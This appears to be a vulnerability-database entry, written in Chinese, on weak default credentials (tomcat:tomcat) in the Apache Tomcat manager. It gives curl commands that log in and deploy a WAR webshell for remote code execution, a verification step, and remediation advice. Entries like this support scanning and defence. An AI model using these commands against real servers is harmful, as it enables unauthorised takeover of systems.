---
id: TOMCAT-TOMCAT8
title: Tomcat7+ 弱口令 && 后台Getshell漏洞
product: tomcat
vendor: Apache
version_affected: "7.0+"
severity: CRITICAL
tags: [rce, 需要认证]
fingerprint: ["Apache Tomcat", "Tomcat"]
---

## 漏洞描述

Tomcat 支持在后台部署 war 文件，可以直接将 webshell 部署到 web 目录下。如果存在弱口令（如 tomcat:tomcat），攻击者可以登录后台并上传 war 包获取服务器权限。

## 影响版本

- Apache Tomcat 7.0+

## 前置条件

- 需要弱口令认证（tomcat:tomcat）
- manager 页面可访问

## 利用步骤

1. 访问后台管理页面 `/manager/html`
2. 使用弱口令登录
3. 上传 war 包 webshell

## Payload

```bash
# 登录后台
curl -u tomcat:tomcat http://target:8080/manager/html

# 上传 war 包
curl -u tomcat:tomcat -T shell.war http://target:8080/manager/deploy?path=/shell
```

## 验证方法

```bash
# 访问 webshell
curl http://target:8080/shell/
```

## 修复建议

1. 修改或删除 Tomcat 弱口令
2. 限制 manager 页面访问来源
3. 使用强密码策略
